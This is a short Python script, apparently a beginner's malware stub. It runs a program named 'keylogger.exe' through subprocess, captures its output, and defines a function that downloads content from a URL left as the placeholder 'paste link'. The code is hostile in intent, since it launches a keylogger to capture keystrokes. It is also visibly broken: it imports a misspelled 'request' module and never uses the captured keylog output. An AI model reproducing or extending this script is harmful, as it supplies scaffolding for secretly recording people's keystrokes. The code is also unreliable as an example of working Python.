#download request package

import request,subprocess

def download(url):
   result = request.get(url)
   print(result.content)


result_of_keylogs = subprocess.check_output("keylogger.exe")
download("paste link")